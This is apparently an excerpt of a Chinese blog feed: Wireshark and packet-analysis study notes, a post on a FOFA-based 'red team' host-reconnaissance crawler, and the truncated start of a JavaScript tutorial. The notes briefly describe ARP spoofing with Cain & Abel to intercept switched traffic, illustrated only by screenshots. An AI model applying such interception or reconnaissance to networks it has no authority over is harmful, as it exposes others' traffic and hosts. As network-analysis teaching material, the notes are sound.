        <content type="html"><![CDATA[<h2 id="数据分析基础"><a href="#数据分析基础" class="headerlink" title="数据分析基础"></a>数据分析基础</h2><h4 id="数据包分析概念"><a href="#数据包分析概念" class="headerlink" title="数据包分析概念"></a>数据包分析概念</h4><p>又名数据包嗅探或协议分析：</p><p>捕获和解析网络上在线传输数据的过程</p><p>目的：</p><p>为了更高的了解网络上正在发生的事情</p><h4 id="数据分析的目标"><a href="#数据分析的目标" class="headerlink" title="数据分析的目标"></a>数据分析的目标</h4><p>了解网络特征</p><p>查看通信主体</p><p>确认占用带宽者</p><p>识别网络高峰时段</p><p>识别攻击和恶意活动</p><p>查找不安全和滥用网络的应用</p><h4 id="数据分析软件"><a href="#数据分析软件" class="headerlink" title="数据分析软件"></a>数据分析软件</h4><p>Tcpdump(命令行)</p><p>OmniPeek(GUI)</p><p>Wireshark(GUI)</p><h4 id="数据分析协议"><a href="#数据分析协议" class="headerlink" title="数据分析协议"></a>数据分析协议</h4><table><thead><tr><th>层次</th><th>协议</th></tr></thead><tbody><tr><td>应用层</td><td>HTTP、SMTP、FTP、Telnet</td></tr><tr><td>表示层</td><td>ACSII、MPEG、JPEG、MIDI</td></tr><tr><td>会话层</td><td>NetBIOS、SAP、SDP、NWLink</td></tr><tr><td>传输层</td><td>TCP、UDP、SPX</td></tr><tr><td>网络层</td><td>IP、IPX</td></tr><tr><td>链路层</td><td>Ethernet、Token Ring、FDDI、AppleTalk</td></tr></tbody></table><h4 id="数据封装"><a href="#数据封装" class="headerlink" title="数据封装"></a>数据封装</h4><p>协议栈中的每层协议都负责在传输数据上增加一个协议头部或者尾部，其中包含了使协议栈之间能够进行通信的额外信息。</p><p>数据封装过程将创建一个协议数据单元PDU，其中包括正在发送的网络数据，以及所有增加的头部和尾部协议信息。</p><p>数据包指的是一个完整的PDU</p><h4 id="网络硬件"><a href="#网络硬件" class="headerlink" title="网络硬件"></a>网络硬件</h4><p>集线器：工作在半双工模式，即可能同时发送和接收数据，会将数据包广播到所有集线器端口，适合用于抓包</p><p>交换机：工作在全双工模式，数据包发往目的计算机连接的端口</p><p>路由器：负责在两个或多个网络间转发数据包。</p><h4 id="流量分类"><a href="#流量分类" class="headerlink" title="流量分类"></a>流量分类</h4><p>（1）广播流量<br>广播包被发送到一个网段上所有端口，</p><p>二层广播地址是FF:FF:FF:FF:FF:FF，</p><p>三层广播地址是主机地址为255 的 IP 地址；</p><p>路由器可以分割广播域。<br>（2）多播流量<br>多播是将单一来源数据包同时传输给多个目标的通信方式，避免了数据包的大量复制，减少了网络带宽使用率。</p><p>实施方法是通过将数据包接收者加入多播组的方式。</p><p>多播地址是224.0.0.0 ~239.255.255.255。<br>（3）单播流量<br>一台计算机直接传输到另一台计算机。</p><h2 id="监听网络线路"><a href="#监听网络线路" class="headerlink" title="监听网络线路"></a>监听网络线路</h2><h4 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h4><p>数据包嗅探器放置的位置</p><h4 id="混杂模式"><a href="#混杂模式" class="headerlink" title="混杂模式"></a>混杂模式</h4><p>需要一个支持混杂模式驱动的网卡，能够查看到所有流经网络线路数据包的驱动模式</p><h4 id="集线器嗅探方式"><a href="#集线器嗅探方式" class="headerlink" title="集线器嗅探方式"></a>集线器嗅探方式</h4><p>流经集线器的所有网络数据包都会被发送到每一个集线器连接的端口</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508130300217.png" alt="image-20200508130300217"></p><h4 id="交换机嗅探方式"><a href="#交换机嗅探方式" class="headerlink" title="交换机嗅探方式"></a>交换机嗅探方式</h4><p>端口镜像、集线器输出、使用网络分流器、ARP欺骗攻击</p><h6 id="端口镜像"><a href="#端口镜像" class="headerlink" title="端口镜像"></a>端口镜像</h6><p>设置连接的交换机的端口镜像功能，将交换机其他一个或多个端口的经过的数据包复制一份到嗅探器连接的端口上。</p><p>需要留意你所镜像端口的流量负载。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508131139921.png" alt="image-20200508131139921"></p><h6 id="集线器输出"><a href="#集线器输出" class="headerlink" title="集线器输出"></a>集线器输出</h6><p>在目标设备和交换机间插接一个集线器，嗅探器也接在集线器上。在交换机不支持端口镜像时可使用此方法。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508131251593.png" alt="image-20200508131251593"></p><h6 id="网络分流器"><a href="#网络分流器" class="headerlink" title="网络分流器"></a>网络分流器</h6><p>类型：有聚合的和非聚合</p><p>相同点：安置在两个设备间来嗅探所有流经的网络通信，</p><p>不同点：聚合的是三个端口，非聚合的是四个端口</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508131649207.png" alt="image-20200508131649207"></p><h6 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h6><p>通过发送包含虚假MAC 地址的ARP(地址解析)消息，劫持其他计算机流量的过程。</p><p>它是在交换机式网络中进行的高级技术。</p><h6 id="使用Cain-Abel-软件进行ARP-欺骗"><a href="#使用Cain-Abel-软件进行ARP-欺骗" class="headerlink" title="使用Cain &amp; Abel 软件进行ARP 欺骗"></a>使用Cain &amp; Abel 软件进行ARP 欺骗</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132031567.png" alt="image-20200508132031567"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132043069.png" alt="image-20200508132043069"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132151852.png" alt="image-20200508132151852"></p><p>此时利用Wireshark抓包分析即可</p><h4 id="路由器嗅探方式"><a href="#路由器嗅探方式" class="headerlink" title="路由器嗅探方式"></a>路由器嗅探方式</h4><p>在处理涉及多个网段与路由器的问题时，需要将嗅探器移动到不同的位置上，才获得一个完整的网络拓朴。</p><h2 id="Wireshark基础用法"><a href="#Wireshark基础用法" class="headerlink" title="Wireshark基础用法"></a>Wireshark基础用法</h2><h4 id="查找：Ctrl-F"><a href="#查找：Ctrl-F" class="headerlink" title="查找：Ctrl+F"></a>查找：Ctrl+F</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132521210.png" alt="image-20200508132521210"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132626625.png" alt="image-20200508132626625"></p><table><thead><tr><th>搜索类型</th><th>例子</th></tr></thead><tbody><tr><td>Display filter 表达式筛选</td><td>Not ip<br />Ip.addr&#x3D;&#x3D;192.168.0.1 <br />Ar</td></tr><tr><td>Hex Value 十六进制值筛选</td><td>00:ff<br />Ff:ff <br />00?b1:f</td></tr><tr><td>String 字符串筛选</td><td>Workstation1<br />UserB <br />Domain</td></tr></tbody></table><h4 id="标记：Ctrl-M-或右键菜单"><a href="#标记：Ctrl-M-或右键菜单" class="headerlink" title="标记：Ctrl+M 或右键菜单"></a>标记：Ctrl+M 或右键菜单</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132708970.png" alt="image-20200508132708970"></p><h4 id="时间显示格式"><a href="#时间显示格式" class="headerlink" title="时间显示格式"></a>时间显示格式</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132731883.png" alt="image-20200508132731883"></p><h4 id="相对时间：Ctrl-T"><a href="#相对时间：Ctrl-T" class="headerlink" title="相对时间：Ctrl+T"></a>相对时间：Ctrl+T</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132755763.png" alt="image-20200508132755763"></p><h4 id="捕获选项：Ctrl-K"><a href="#捕获选项：Ctrl-K" class="headerlink" title="捕获选项：Ctrl+K"></a>捕获选项：Ctrl+K</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132816479.png" alt="image-20200508132816479"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132838125.png" alt="image-20200508132838125"></p><h4 id="名字解析"><a href="#名字解析" class="headerlink" title="名字解析"></a>名字解析</h4><h6 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h6><ul><li>MAC 地址解析(Resolve MAC addresses):MAC 转换成IP</li><li>网络层名字解析(Resolve network-layer names):IP 转换成DNS 名称(网址)</li><li>传输层名字解析(Resolve transport-layer names):将端口转换成协议</li><li>使用外部网络名称解析器（Use external network name resolver)</li></ul><h6 id="弊端"><a href="#弊端" class="headerlink" title="弊端"></a>弊端</h6><ul><li>解析可能失败；</li><li>打开捕获文件都要重新解析一遍；</li><li>解析DNS 名字会产生额外流量；</li><li>解析过程占用系统资源。</li></ul><h4 id="协议解析"><a href="#协议解析" class="headerlink" title="协议解析"></a>协议解析</h4><p>右键点击数据包，选择Decode As，创建强制解码器，比如可以强制将80 端口解析成FTP 协议，点击Clear 可清除强制解码器。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133213717.png" alt="image-20200508133213717"></p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><h6 id="过滤器BPF-语法"><a href="#过滤器BPF-语法" class="headerlink" title="过滤器BPF 语法"></a>过滤器BPF 语法</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133637658.png" alt="image-20200508133637658"></p><p>逻辑运算符：与&amp;&amp;或||非!</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133716462.png" alt="image-20200508133716462"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133743486.png" alt="image-20200508133743486"></p><table><thead><tr><th>表达式</th><th>说明</th></tr></thead><tbody><tr><td>Src 192.168.0.10 &amp;&amp; port 80</td><td>捕获源地址是192.168.0.10 和源端口或目标端口是80 的流量</td></tr><tr><td>Host 172.16.16.149</td><td>捕获某个 IP 的计算机的流</td></tr><tr><td>Host testserver2</td><td>捕获某个主机名的计算机的流量</td></tr><tr><td>Ether host 00-1a-a0-52-e2-a0</td><td>捕获某个 MAC 地址的计算机的流量</td></tr><tr><td>Src host 172.16.16.149</td><td>捕获来自某台计算机的流量</td></tr><tr><td>Dst host 172.16.16.149</td><td>捕获前往某台计算机的流量</td></tr><tr><td>Port 8080</td><td>捕获指定端口的流量</td></tr><tr><td>!port 8080</td><td>捕获除指定端口以外的所有流量</td></tr><tr><td>Dst port 80</td><td>捕获前往监听 HTTP 80 端口的流量</td></tr><tr><td>icmp</td><td>捕获指定协议的流量</td></tr><tr><td>!ip6</td><td>捕获排除 IPv6 的流量</td></tr><tr><td>Icmp[0]&#x3D;&#x3D;3</td><td>捕获偏移量为0 值为3（目标不可达）的 ICMP 数据包流量</td></tr><tr><td>Icmp[0]&#x3D;&#x3D;8 or icmp[0]&#x3D;&#x3D;0</td><td>捕获代表 echo 请求（类型8）或 echo 回复（类型0）的 ICMP 数据包流量</td></tr><tr><td>Icmp[0:2]&#x3D;&#x3D;0x0301</td><td>捕获以类型3 代码1 表示的目标不可达、主机不可达的 ICMP 数据包流量</td></tr><tr><td>Tcp[13]&amp;1&#x3D;&#x3D;1</td><td>捕获设置了 FIN 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;2&#x3D;&#x3D;2</td><td>捕获设置了 SYN 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;4&#x3D;&#x3D;4</td><td>捕获设置了 RST 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;8&#x3D;&#x3D;8</td><td>捕获设置了 PSH 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;16&#x3D;&#x3D;16</td><td>捕获设置了 ACK 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;32&#x3D;&#x3D;32</td><td>捕获设置了 URG 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&#x3D;&#x3D;18</td><td>捕获 TCP SYN-ACK 数据包</td></tr><tr><td>Ether host 00:00:00:00:00:00</td><td>捕获流入或流出你 MAC 地址的流量</td></tr><tr><td>!ether host 00:00:00:00:00:00</td><td>捕获流入或流出你 MAC 地址以外的流量</td></tr><tr><td>Broadcast</td><td>捕获广播流量</td></tr><tr><td>Udp</td><td>捕获 UDP 流量</td></tr></tbody></table><h6 id="显示过滤器"><a href="#显示过滤器" class="headerlink" title="显示过滤器"></a>显示过滤器</h6><p>可以通过设置自带的过滤表达式来过滤显示数据</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134355154.png" alt="image-20200508134355154"></p><h6 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134416613.png" alt="image-20200508134416613"></p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;&#x3D;</td><td>等于</td></tr><tr><td>!&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&lt;&#x3D;</td><td>小于或等于</td></tr><tr><td>&gt;&#x3D;</td><td>大于或等于</td></tr></tbody></table><h6 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134558038.png" alt="image-20200508134558038"></p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>And</td><td>两个条件需同时满足</td></tr><tr><td>Or</td><td>其中一个条件被满足</td></tr><tr><td>Xor</td><td>有且仅有一个条件被满足</td></tr><tr><td>Not</td><td>没有条件被满足</td></tr></tbody></table><h6 id="过滤器举例"><a href="#过滤器举例" class="headerlink" title="过滤器举例"></a>过滤器举例</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134805125.png" alt="image-20200508134805125"></p><table><thead><tr><th>过滤器</th><th>说明</th></tr></thead><tbody><tr><td>!tcp.port&#x3D;&#x3D;3389</td><td>排除 RDP 流量</td></tr><tr><td>Tcp.flags.syn&#x3D;&#x3D;1</td><td>具有 SYN 标志位的 TCP 数据包</td></tr><tr><td>Tcp.flags.rst&#x3D;&#x3D;1</td><td>具有 RST 标志位的 TCP 数据包</td></tr><tr><td>!arp</td><td>排除 ARP 流量</td></tr><tr><td>http</td><td>所有 HTTP 流量</td></tr><tr><td>Tcp.port&#x3D;&#x3D;23|| tcp.port&#x3D;&#x3D;21</td><td>文本管理流量（telnet 或 ftp）</td></tr><tr><td>Smtp|| pop || imap</td><td>文本 email 流量</td></tr><tr><td>Ip.addr&#x3D;&#x3D;192.168.1.1</td><td>指定 IP 流量</td></tr><tr><td>Frame.len&lt;&#x3D;128</td><td>长度小于等于128 字节的数据包</td></tr></tbody></table><h2 id="流量分析和图形化功能"><a href="#流量分析和图形化功能" class="headerlink" title="流量分析和图形化功能"></a>流量分析和图形化功能</h2><h4 id="网络端点"><a href="#网络端点" class="headerlink" title="网络端点"></a>网络端点</h4><p>统计每个端点的地址、发送或收到的数据包的数量和字节数</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135314004.png" alt="image-20200508135314004"></p><h4 id="网络会话"><a href="#网络会话" class="headerlink" title="网络会话"></a>网络会话</h4><p>统计地址A 和地址B 端点间会话的发送或收到的数据包的数量和字节数。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135359224.png" alt="image-20200508135359224"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135409193.png" alt="image-20200508135409193"></p><h4 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h4><p>可查看各种协议的分布统计情况。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135516681.png" alt="image-20200508135516681"></p><h4 id="数据包长度分析"><a href="#数据包长度分析" class="headerlink" title="数据包长度分析"></a>数据包长度分析</h4><p>以太网帧最大长度为1518 字节，图中较大数据包（1280<del>2559）常用于传输数据，较小的（40</del>79）则是协议控制序列，一个TCP 控制数据包大约在54 字节。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135832083.png" alt="image-20200508135832083"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135910553.png" alt="image-20200508135910553"></p><h4 id="跟踪TCP流"><a href="#跟踪TCP流" class="headerlink" title="跟踪TCP流"></a>跟踪TCP流</h4><p>红色表示从源地址前往目标地址的流量，蓝色相反。最初是对WEB 根目录的GET 请求，然后是来自服务器的一个用HTTP&#x2F;1.1 200 OK 表示请求成功的响应。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140025257.png" alt="image-20200508140025257"></p><h4 id="图形展示"><a href="#图形展示" class="headerlink" title="图形展示"></a>图形展示</h4><h6 id="查看IO图"><a href="#查看IO图" class="headerlink" title="查看IO图"></a>查看IO图</h6><p>通过选择X 轴（数据包间隔时间）、Y 轴（数据包数量上限）来调整显示的IO 图形，图中显示每团体传输0~200 个数据包之间，且波动很大，表示是一个慢速下载过程。通过过滤器可以将不同流量以不同颜色显示IO 图形对比</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140151578.png" alt="image-20200508140151578"></p><h6 id="双向时间图"><a href="#双向时间图" class="headerlink" title="双向时间图"></a>双向时间图</h6><p>基于两个端口间TCP 连接对话，确认数据包已被成功接收所需的时间，可与对话统计配合使用</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140259289.png" alt="image-20200508140259289"></p><p>图中每一个点都代表了一个数据包的双向时间，单击任何一点可以在Packet List 面板中看到相应数据包；</p><p>图中显示大部分数据多在0.05s 以下，少量在0.10~0.25s 间，对于慢速下载（看网页、微博等）来说是可以接受的</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140327267.png" alt="image-20200508140327267"></p><h6 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h6><p>对于连接可视化，以及将一段时间中的数据流显示出来，配合对话统计使用，可查看两端点间的数据流。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140747447.png" alt="image-20200508140747447"></p><h4 id="专家信息"><a href="#专家信息" class="headerlink" title="专家信息"></a>专家信息</h4><h6 id="数据包标记"><a href="#数据包标记" class="headerlink" title="数据包标记"></a>数据包标记</h6><p>警告信息：不正常通信中的异常数据包</p><ul><li>丢失：上一段数据包丢失时</li><li>延收：已确认丢失的数据包，又收到了其ACK 包时</li><li>保活：当一个连接的保活数据包出现时</li><li>零窗：接收方达到窗口大小，发出一个零窗口通知时</li><li>乱序：当数据包被乱序接收时</li><li>重传：一次重传会在收到一个重复ACK 的20 毫秒内进行</li></ul><p>注意消息：正常通信中的异常数据包</p><ul><li>重传：收到重复的ACK 或重传计时器超时时</li><li>重复ACK：当主机没有收到下一个期望序列号的数据包时，会生成最近收到数据的重复ACK</li><li>零窗探查：零窗口通知包发出后，用来监视TCP 接收窗口的状态</li><li>保活ACK：用来响应保活数据包</li><li>零窗ACK：用来响应零窗口探查数据包</li><li>窗口已满：通知传输主机其接收者的TCP 接收窗口已满</li></ul><p>对话消息：关于通信的基本信息</p><ul><li>窗口更新：接收者发出，通知发送者TCP 接收窗口大小已被改变</li></ul><h6 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508141655240.png" alt="image-20200508141655240"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508141748503.png" alt="image-20200508141748503"></p><h2 id="通用底层网络协议"><a href="#通用底层网络协议" class="headerlink" title="通用底层网络协议"></a>通用底层网络协议</h2><h4 id="地址解析协议ARP（Address-Resolution-Protocol）"><a href="#地址解析协议ARP（Address-Resolution-Protocol）" class="headerlink" title="地址解析协议ARP（Address Resolution Protocol）"></a>地址解析协议ARP（Address Resolution Protocol）</h4><h6 id="ARP头"><a href="#ARP头" class="headerlink" title="ARP头"></a>ARP头</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508142533600.png" alt="image-20200508142533600"></p><h6 id="数据包分析-1"><a href="#数据包分析-1" class="headerlink" title="数据包分析"></a>数据包分析</h6><p>长度：8 位&#x2F;字节，MAC 地址48 位，即6 字节，IP 地址32 位，即4 字节。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508142658491.png" alt="image-20200508142658491"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508203109003.png" alt="image-20200508203109003"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508203125110.png" alt="image-20200508203125110"></p><h6 id="无偿的ARP"><a href="#无偿的ARP" class="headerlink" title="无偿的ARP"></a>无偿的ARP</h6><p>当IP 地址改变后，网络主机中缓存的IP 和MAC 映射就失效了，为了防止通信错误， 无偿ARP 请求被发送到网络中，强制所有收到它的设备更新ARP 映射缓存。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508203209281.png" alt="image-20200508203209281"></p><h4 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h4><h6 id="IP头"><a href="#IP头" class="headerlink" title="IP头"></a>IP头</h6><p>服务类型：优先级标志位和服务类型标志位，用来进行QoS 标识符：识别一个数据包或被分片数据包的次序，唯一 标记：标记数据包是否是一组分片数据包的一部分 分片偏移：该数据包是个分片，数据包按分片偏移值顺序重组 存活时间TTL：超过TTL 时间，数据包将被丢弃</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508230648007.png" alt="image-20200508230648007"></p><h6 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h6><p>IP 用于解决跨越不同类型网络时可靠传输的一个特性：将一个数据流分为更小的片段。</p><p>基于第2 层数据链路协议所使用的最大传输单元MTU（Maximum Transmission Unit）的大小， 默认是1500 字节（不包含14 字节的以太网头本身），当数据包大小大于MTU 时会被分片。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144125483.png" alt="image-20200609144125483"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144259764.png" alt="image-20200609144259764"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144324142.png" alt="image-20200609144324142"></p><h4 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h4><p>作用:</p><p>为数据提供可靠的端到端传输，处理数据的顺序和错误恢复，保证 数据能够到达其应到达的地方</p><h6 id="TCP头"><a href="#TCP头" class="headerlink" title="TCP头"></a>TCP头</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144536031.png" alt="image-20200609144536031"></p><p>序号：表示一个TCP 片段。 </p><p>确认号：希望从另一个设备得到的下一个数据包的序号。 </p><p>紧急指针：如果设置了URG 位，紧急指针将告诉CPU 从数据包 的哪里开始读取数据。</p><h6 id="TCP-端口"><a href="#TCP-端口" class="headerlink" title="TCP 端口"></a>TCP 端口</h6><ul><li>1~1023：标准端口组，特定服务会用到标准端口。 </li><li>1024~65535：临时端口组，操作系统会随机地选择一个源端口让某个通信单独 使用。</li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151143156.png" alt="image-20200609151143156"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151202646.png" alt="image-20200609151202646"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151230714.png" alt="image-20200609151230714"></p><h6 id="TCP标志"><a href="#TCP标志" class="headerlink" title="TCP标志"></a>TCP标志</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151259303.png" alt="image-20200609151259303"></p><h6 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151424872.png" alt="image-20200609151424872"></p><p>设置TCP 数据包序列号显示方式;</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151444821.png" alt="image-20200609151444821"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA Advanced Information Crawling Tool</title>
      <link href="/2020/05/05/FOFA-Advanced-Information-Crawling-Tool/"/>
      <url>/2020/05/05/FOFA-Advanced-Information-Crawling-Tool/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近写了一个爬虫小工具，地址</p><p><code>https://github.com/L0kiii/FofaScan</code></p><h2 id="【红队信息收集利器】FOFA-Host-Details"><a href="#【红队信息收集利器】FOFA-Host-Details" class="headerlink" title="【红队信息收集利器】FOFA Host Details"></a>【红队信息收集利器】FOFA Host Details</h2><p><code>author:L0ki</code></p><p><code>blog：http://l0ki.net</code></p><p>IP 端口 协议 网站组件分层  指纹识别 序列化输出显示</p><p>指纹识别基于<code>@author:w8ay</code></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#若cms无对应值则代表识别不到</span><br><span class="line">python3 HostDetails.py</span><br></pre></td></tr></table></figure><h2 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200807143505847.png" alt="image-20200807143505847"></p><h2 id="组件分层"><a href="#组件分层" class="headerlink" title="组件分层"></a>组件分层</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200807143425425.png" alt="image-20200807143425425"></p><h2 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;: &quot;baidu.com&quot;, &quot;ip&quot;: [&quot;39.156.69.79&quot;], &quot;协议&quot;: &quot; https http&quot;, &quot;端口&quot;: &quot;443&quot;, &quot;组件&quot;: &quot;D***********t&quot;,&quot;CMS&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;url&quot;: &quot;baidu.com&quot;, &quot;ip&quot;: [&quot;39.156.69.79&quot;], &quot;协议&quot;: &quot; https http&quot;, &quot;端口&quot;: &quot;80&quot;, &quot;组件&quot;: &quot;Apache-Web-Server&quot;,&quot;CMS&quot;:&quot;&quot;&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">if u r vip:</span><br><span class="line">&#123;&quot;url&quot;:&quot;baidu.com&quot;,&quot;ip&quot;: [&quot;39.156.69.79&quot;], &quot;协议&quot;: &quot; https http&quot;, &quot;端口&quot;: &quot;443&quot;, &quot;组件&quot;: &quot;DigiCert-Cert&quot;,&quot;CMS&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;baidu.com&quot;,&quot;ip&quot;: [&quot;39.156.69.79&quot;], &quot;协议&quot;: &quot; https http&quot;, &quot;端口&quot;: &quot;80&quot;, &quot;组件&quot;: &quot;Apache-Web-Server&quot;,&quot;CMS&quot;:&quot;&quot;&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mini Programs and JavaScript</title>
      <link href="/2020/03/20/Mini-Programs-and-JavaScript/"/>
      <url>/2020/03/20/Mini-Programs-and-JavaScript/</url>
      
        <content type="html"><![CDATA[<h1 id="小程序与JavaScript"><a href="#小程序与JavaScript" class="headerlink" title="小程序与JavaScript"></a>小程序与JavaScript</h1><h2 id="0x01-控制台Console"><a href="#0x01-控制台Console" class="headerlink" title="0x01 控制台Console"></a>0x01 控制台Console</h2><p>需要掌握JavaScript的基本语法</p><p>了解如何使用JavaScript来操作小程序（通过API接口）</p><p><strong>Console.log打印日志、四则运算、字符串</strong></p><h3 id="0x001-console-log打印数组Array"><a href="#0x001-console-log打印数组Array" class="headerlink" title="0x001 console.log打印数组Array"></a>0x001 console.log打印数组Array</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="string">&quot;肖申克的救赎&quot;</span>,<span 